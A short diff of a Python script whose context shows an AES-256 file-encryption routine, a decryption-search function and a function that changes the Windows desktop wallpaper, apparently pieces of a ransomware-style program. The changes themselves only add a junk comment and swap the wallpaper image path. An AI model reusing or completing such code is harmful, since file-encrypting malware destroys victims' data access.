@@ -8,6 +8,8 @@ IV_SIZE = 16    # 128 bit, fixed for the AES algorithm
 KEY_SIZE = 32   # 256 bit meaning AES-256, can also be 128 or 192 bits
 SALT_SIZE = 16  # This size is arbitrary
 
+#sdfsdfsdfsdfsdf
+
 def enc_file(base, in_filename, out_filename, chunksize=64*1024):
     iv = base[0:IV_SIZE]
     key = base[IV_SIZE:]
@@ -81,7 +83,7 @@ def search_dec(path):
 
 def change_bg():
     dir = ''
-    imagePath = 'C:/Users/tmdgh/Desktop/test.jpg'
+    imagePath = 'C:/Users/tmdgh/Desktop/윾즉2.jpg'
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, imagePath, 3)
 
